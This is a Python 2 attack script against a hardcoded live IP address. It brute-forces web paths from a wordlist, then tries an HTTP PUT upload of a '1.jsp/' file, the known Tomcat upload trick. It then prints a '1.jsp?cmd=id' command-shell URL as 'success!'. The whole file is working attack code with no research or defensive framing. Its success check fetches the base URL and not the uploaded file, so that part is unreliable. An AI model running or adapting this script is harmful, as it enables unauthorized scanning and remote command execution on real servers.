import sys
import requests
import time
requests.packages.urllib3.disable_warnings()

headers = {
    'Connection': 'close',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, sdch, br',
    'Accept-Language': 'zh-CN,zh;q=0.8',
}
url = 'http://207.148.111.48:8080/'
txt = open('1.txt','r')
def ml():
    for urlt in txt:
        r = url + urlt
        urls = r.strip('\n')
        req = requests.get(url=urls,headers=headers)
        if req.status_code == 401:
            print 'denglv' + '  ' +  urls
        if req.status_code == 404:
            print 'No' + '  ' + urls
        if req.status_code == 200:
            print 'Ok' + '  ' + urls
def ld():
    urlx = url + '/1.jsp/'
    data = """test"""
    try:
        requests.put(url=urlx,headers=headers,data=data)
        time.sleep(2)
        verify_response = requests.get(url[:-1],headers=headers)
        if verify_response.status_code == 200:
            print 'success!' + '  ' + url + '1.jsp?cmd=id'
        else:
            print verify_response.status_code
    except:pass

if __name__=="__main__":
    ml()
    ld()
